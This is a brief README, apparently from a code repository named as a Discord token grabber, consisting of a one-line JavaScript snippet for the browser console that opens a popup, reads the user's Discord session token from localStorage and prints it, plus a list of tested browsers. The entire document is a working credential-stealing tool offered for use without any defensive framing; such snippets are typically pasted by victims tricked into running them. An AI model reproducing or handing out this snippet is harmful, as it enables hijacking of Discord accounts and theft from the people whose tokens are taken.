# jsConsole-discordTokenGrabber

```js
(function(){let w=window.open();if(!w||!w.document)return console.error('Popup blocked! Can\'t get token.');console.log(JSON.parse(w.localStorage.token));w.close()}());
```

Tested browsers:
Chrome
Safari
